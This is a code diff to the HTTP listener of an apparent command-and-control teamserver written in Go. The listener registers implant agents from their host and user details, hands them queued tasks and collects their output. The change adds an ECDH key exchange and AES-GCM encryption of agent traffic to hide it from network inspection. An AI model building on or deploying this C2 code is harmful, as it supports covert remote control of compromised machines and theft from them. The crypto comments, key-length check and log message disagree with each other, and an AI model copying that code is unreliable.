@@ -2,6 +2,7 @@ package listeners
 
 import (
 	"context"
+	"crypto/rand"
 	"crypto/tls"
 	"encoding/base64"
 	"encoding/json"
@@ -18,6 +19,7 @@ import (
 	"github.com/rs/zerolog/log"
 
 	"apex/teamserver/internal/agents"
+	apexcrypto "apex/teamserver/internal/crypto"
 	"apex/teamserver/internal/credentials"
 	"apex/teamserver/internal/tasks"
 )
@@ -32,6 +34,7 @@ type HTTPListener struct {
 	agents   *agents.Manager
 	tasks    *tasks.Queue
 	creds    *credentials.Vault
+	sessions *apexcrypto.SessionStore
 	running  bool
 	mu       sync.RWMutex
 }
@@ -43,6 +46,7 @@ func NewHTTP(cfg Config, agentMgr *agents.Manager, taskQueue *tasks.Queue, credV
 		agents:   agentMgr,
 		tasks:    taskQueue,
 		creds:    credVault,
+		sessions: apexcrypto.NewSessionStore(),
 	}
 }
 
@@ -123,32 +127,41 @@ func (h *HTTPListener) Stop(ctx context.Context) error {
 	return nil
 }
 
+// ── Wire types ────────────────────────────────────────────────────────────────
+
 type agentSysinfo struct {
-	Hostname     string `json:"hostname"`
-	Username     string `json:"username"`
-	OS           string `json:"os"`
-	Arch         string `json:"arch"`
-	PID          int    `json:"pid"`
-	ProcessName  string `json:"process_name"`
-	InternalIP   string `json:"internal_ip"`
-	Sleep        int    `json:"sleep"`
-	Jitter       int    `json:"jitter"`
+	Hostname    string `json:"hostname"`
+	Username    string `json:"username"`
+	OS          string `json:"os"`
+	Arch        string `json:"arch"`
+	PID         int    `json:"pid"`
+	ProcessName string `json:"process_name"`
+	InternalIP  string `json:"internal_ip"`
+	Sleep       int    `json:"sleep"`
+	Jitter      int    `json:"jitter"`
 }
 
+// checkInRequest is the plaintext JSON sent by the agent on first check-in.
+// PubKey is the base64-encoded 32-byte Curve25519 public key.
 type checkInRequest struct {
 	Sysinfo *agentSysinfo       `json:"sysinfo,omitempty"`
+	PubKey  string              `json:"pubkey,omitempty"`
 	Results []taskResultPayload `json:"results,omitempty"`
 }
 
 type taskResultPayload struct {
 	TaskID  string `json:"task_id"`
-	Output  string `json:"output"`  // base64
+	Output  string `json:"output"` // base64
 	Success bool   `json:"success"`
 }
 
+// checkInResponse is the plaintext JSON sent back on first check-in.
+// ServerPubKey and KexNonce are only present during key exchange.
 type checkInResponse struct {
-	AgentID string         `json:"agent_id,omitempty"`
-	Tasks   []taskResponse `json:"tasks,omitempty"`
+	AgentID     string         `json:"agent_id,omitempty"`
+	ServerPubKey string        `json:"server_pubkey,omitempty"`
+	KexNonce    string         `json:"kex_nonce,omitempty"`
+	Tasks       []taskResponse `json:"tasks,omitempty"`
 }
 
 type taskResponse struct {
@@ -157,8 +170,10 @@ type taskResponse struct {
 	Arguments string `json:"arguments"` // base64
 }
 
+// ── Handler ───────────────────────────────────────────────────────────────────
+
 func (h *HTTPListener) handleCheckIn(w http.ResponseWriter, r *http.Request) {
-	body, err := io.ReadAll(io.LimitReader(r.Body, 1<<20))
+	rawBody, err := io.ReadAll(io.LimitReader(r.Body, 1<<20))
 	if err != nil {
 		http.Error(w, "", http.StatusBadRequest)
 		return
@@ -176,61 +191,47 @@ func (h *HTTPListener) handleCheckIn(w http.ResponseWriter, r *http.Request) {
 	log.Debug().
 		Str("remote", r.RemoteAddr).
 		Str("agent_id", agentID).
-		Int("body_len", len(body)).
+		Int("body_len", len(rawBody)).
 		Msg("Listener: incoming request")
 
 	externalIP, _, _ := net.SplitHostPort(r.RemoteAddr)
 
 	// Emit for legacy consumers (e.g. events)
 	select {
-	case h.checkins <- CheckIn{AgentID: agentID, ExternalIP: externalIP, Data: body}:
+	case h.checkins <- CheckIn{AgentID: agentID, ExternalIP: externalIP, Data: rawBody}:
 	default:
 	}
 
+	// ── If the body is encrypted, decrypt it first ─────────────────────────────
+	encrypted := r.Header.Get("X-Encrypted") == "1"
+	body := rawBody
+
+	if encrypted && agentID != "" {
+		sessionKey, ok := h.sessions.Get(agentID)
+		if !ok {
+			log.Warn().Str("agent_id", agentID).Msg("Encrypted request from unknown agent — dropping")
+			http.Error(w, "unknown agent", http.StatusUnauthorized)
+			return
+		}
+		plain, err := apexcrypto.GCMDecrypt(sessionKey, string(rawBody))
+		if err != nil {
+			log.Warn().Err(err).Str("agent_id", agentID).Msg("GCM decryption failed")
+			http.Error(w, "decryption failed", http.StatusBadRequest)
+			return
+		}
+		body = plain
+		log.Debug().Str("agent_id", agentID).Int("plain_len", len(body)).Msg("Decrypted agent body")
+	}
+
+	// ── Parse JSON body ────────────────────────────────────────────────────────
 	var req checkInRequest
 	if len(body) > 0 {
 		_ = json.Unmarshal(body, &req)
 	}
 
-	// First-time registration: no agent ID, body has sysinfo
+	// ── First-time registration: no agent ID, body has sysinfo + pubkey ────────
 	if agentID == "" && req.Sysinfo != nil {
-		s := req.Sysinfo
-		if s.Sleep <= 0 {
-			s.Sleep = 60
-		}
-		if s.Jitter <= 0 {
-			s.Jitter = 15
-		}
-		// Atomically dedupe or register (prevents race where concurrent check-ins all create new agents)
-		agent := &agents.Agent{
-			ID:          uuid.New().String(),
-			Hostname:    s.Hostname,
-			Username:    s.Username,
-			OS:          s.OS,
-			Arch:        s.Arch,
-			PID:         s.PID,
-			ProcessName: s.ProcessName,
-			InternalIP:  s.InternalIP,
-			ExternalIP:  externalIP,
-			Sleep:       s.Sleep,
-			Jitter:      s.Jitter,
-			ListenerID:  h.config.ID,
-		}
-		// 24h window: reuse same agent if same host+user+pid+ip checked in recently
-		registered, reused, err := h.agents.RegisterOrReuse(bgctx, agent, 24*time.Hour)
-		if err != nil {
-			log.Error().Err(err).Msg("Failed to register agent")
-			http.Error(w, "registration failed", http.StatusInternalServerError)
-			return
-		}
-		if reused {
-			log.Debug().
-				Str("existing_id", registered.ID).
-				Str("hostname", s.Hostname).
-				Msg("Returning existing agent_id (dedupe)")
-		}
-		w.Header().Set("Content-Type", "application/json")
-		json.NewEncoder(w).Encode(checkInResponse{AgentID: registered.ID})
+		h.handleRegistration(w, r, req, externalIP)
 		return
 	}
 
@@ -240,7 +241,7 @@ func (h *HTTPListener) handleCheckIn(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	// Publish task results and broadcast to operator UI (use bgctx for reliability)
+	// ── Process task results ───────────────────────────────────────────────────
 	for _, res := range req.Results {
 		out, _ := base64.StdEncoding.DecodeString(res.Output)
 
@@ -280,7 +281,7 @@ func (h *HTTPListener) handleCheckIn(w http.ResponseWriter, r *http.Request) {
 
 	h.agents.CheckIn(agentID)
 
-	// Dequeue pending tasks
+	// ── Dequeue pending tasks ──────────────────────────────────────────────────
 	pending, err := h.tasks.Dequeue(bgctx, agentID)
 	if err != nil {
 		log.Warn().Err(err).Str("agent_id", agentID).Msg("Task dequeue failed")
@@ -304,6 +305,109 @@ func (h *HTTPListener) handleCheckIn(w http.ResponseWriter, r *http.Request) {
 			Msg("Task delivered to agent")
 	}
 
+	// ── Build and send response (encrypted if session exists) ─────────────────
+	h.writeResponse(w, agentID, checkInResponse{Tasks: respTasks})
+}
+
+// handleRegistration processes a first-time check-in: registers the agent and
+// performs the Curve25519 ECDH key exchange.
+func (h *HTTPListener) handleRegistration(w http.ResponseWriter, r *http.Request, req checkInRequest, externalIP string) {
+	s := req.Sysinfo
+	if s.Sleep <= 0 {
+		s.Sleep = 60
+	}
+	if s.Jitter <= 0 {
+		s.Jitter = 15
+	}
+
+	agent := &agents.Agent{
+		ID:          uuid.New().String(),
+		Hostname:    s.Hostname,
+		Username:    s.Username,
+		OS:          s.OS,
+		Arch:        s.Arch,
+		PID:         s.PID,
+		ProcessName: s.ProcessName,
+		InternalIP:  s.InternalIP,
+		ExternalIP:  externalIP,
+		Sleep:       s.Sleep,
+		Jitter:      s.Jitter,
+		ListenerID:  h.config.ID,
+	}
+
+	registered, reused, err := h.agents.RegisterOrReuse(bgctx, agent, 24*time.Hour)
+	if err != nil {
+		log.Error().Err(err).Msg("Failed to register agent")
+		http.Error(w, "registration failed", http.StatusInternalServerError)
+		return
+	}
+	if reused {
+		log.Debug().
+			Str("existing_id", registered.ID).
+			Str("hostname", s.Hostname).
+			Msg("Returning existing agent_id (dedupe)")
+	}
+
+	resp := checkInResponse{AgentID: registered.ID}
+
+	// ── ECDH key exchange ──────────────────────────────────────────────────────
+	if req.PubKey != "" {
+		agentPubBytes, err := base64.StdEncoding.DecodeString(req.PubKey)
+		if err == nil && len(agentPubBytes) == 65 {
+			serverPriv, serverPub, err := apexcrypto.GenerateKeypair()
+			if err != nil {
+				log.Error().Err(err).Msg("ECDH keypair generation failed")
+			} else {
+				var nonce [32]byte
+				if _, err := rand.Read(nonce[:]); err != nil {
+					log.Error().Err(err).Msg("nonce generation failed")
+				}
+
+				sessionKey, err := apexcrypto.DeriveSessionKey(serverPriv, agentPubBytes, nonce)
+				if err != nil {
+					log.Error().Err(err).Msg("Session key derivation failed")
+				} else {
+					h.sessions.Set(registered.ID, sessionKey)
+					resp.ServerPubKey = base64.StdEncoding.EncodeToString(serverPub)
+					resp.KexNonce = base64.StdEncoding.EncodeToString(nonce[:])
+					log.Info().
+						Str("agent_id", registered.ID).
+						Msg("ECDH-P256 key exchange completed — session established")
+				}
+			}
+		} else {
+			log.Warn().Str("agent_id", registered.ID).Msg("Agent sent invalid pubkey length — no encryption")
+		}
+	}
+
+	// Registration response is always plaintext (session being established now)
 	w.Header().Set("Content-Type", "application/json")
-	json.NewEncoder(w).Encode(checkInResponse{Tasks: respTasks})
+	json.NewEncoder(w).Encode(resp)
+}
+
+// writeResponse JSON-encodes resp and, if an encryption session exists for
+// agentID, sends the body as base64(GCM-encrypted JSON). Otherwise plain JSON.
+func (h *HTTPListener) writeResponse(w http.ResponseWriter, agentID string, resp checkInResponse) {
+	plainJSON, err := json.Marshal(resp)
+	if err != nil {
+		http.Error(w, "marshal error", http.StatusInternalServerError)
+		return
+	}
+
+	sessionKey, ok := h.sessions.Get(agentID)
+	if ok {
+		blob, err := apexcrypto.GCMEncrypt(sessionKey, plainJSON)
+		if err != nil {
+			log.Error().Err(err).Str("agent_id", agentID).Msg("GCM encrypt response failed — falling back to plaintext")
+			// fall through to plaintext
+		} else {
+			w.Header().Set("Content-Type", "application/octet-stream")
+			w.Header().Set("X-Encrypted", "1")
+			fmt.Fprint(w, blob)
+			return
+		}
+	}
+
+	w.Header().Set("Content-Type", "application/json")
+	w.Write(plainJSON)
 }
